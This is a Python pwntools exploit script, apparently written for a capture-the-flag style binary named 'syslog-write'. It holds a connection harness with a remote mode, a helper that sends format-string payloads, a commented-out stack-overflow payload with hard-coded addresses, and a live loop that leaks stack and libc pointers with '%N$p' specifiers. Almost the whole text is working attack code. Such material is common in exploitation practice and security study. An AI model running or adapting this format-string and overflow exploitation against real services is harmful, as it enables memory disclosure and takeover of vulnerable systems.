import ctypes
from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Function to be called by FmtStr
def send_payload(payload):
    io.sendlineafter(b':',b'1')
    io.recvuntil(b'etc.)')
    io.sendlineafter(b':', b'1')
    io.recvuntil(b'syslog')
    io.sendlineafter(b': ',payload)
    # Receive the response
    io.recvuntil(b'choice')
    io.sendlineafter(b':',b'2')
    result = io.recvuntil(b'==========').split(b'syslog-write: ')[-1].split(b'\n\n')[0].split(b'==========')[0]
    return result


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *main+428 
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './syslog-write'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'error'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# offset = 818
# address_of_path = 0x000000000000000000007fffffffdfdd
# address_of_shell= 0x000000000000000000007fffffffdd58
# payload = flat(
#     b'A'*offset,
#     address_of_path,
#     address_of_shell,
#     b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaax'
# )

# send_payload(payload)
# io.interactive()
# let's find the libc address

for i in range(1, 101):
    payload = f'%{str(i)}$p'.encode()
    leak = send_payload(payload).split(b'\n')[0]
    print(i, leak)

        

